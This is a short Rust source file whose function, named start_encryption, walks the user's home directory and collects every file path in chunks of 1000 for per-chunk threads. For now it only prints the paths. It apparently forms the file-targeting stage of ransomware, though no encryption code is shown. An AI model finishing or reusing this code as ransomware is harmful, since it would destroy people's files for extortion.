use std::{
    path::PathBuf,
    thread, sync::{Arc, Mutex},
};

use crate::discoverer::user_path_by_os;
use walkdir::WalkDir;

type ArchMutex = Arc<Mutex<Vec<PathBuf>>>;

const MAX_CHUNK_SIZE: usize = 1000;

pub fn start_encryption() {
    let user_path = user_path_by_os().unwrap();
    let walk = WalkDir::new(user_path);

    let chunk: ArchMutex = Arc::new(Mutex::new(Vec::new()));

    for entry in walk.into_iter().filter_map(|e| e.ok()) {
        if entry.path().is_file() {
            let path_buf = entry.path().to_path_buf();
            chunk.lock().unwrap().push(path_buf);

            if chunk.lock().unwrap().len() >= MAX_CHUNK_SIZE {
                let chunk_clone = Arc::clone(&chunk);

                let thread_handler = thread::spawn(move || {
                    let mut chunk_data = chunk_clone.lock().unwrap();

                    for file in chunk_data.iter() {
                        println!("{:?}", file.as_path());
                    }

                    chunk_data.clear();
                });

                thread_handler.join().unwrap();
                chunk.lock().unwrap().clear();
            }
        } 
    }
}
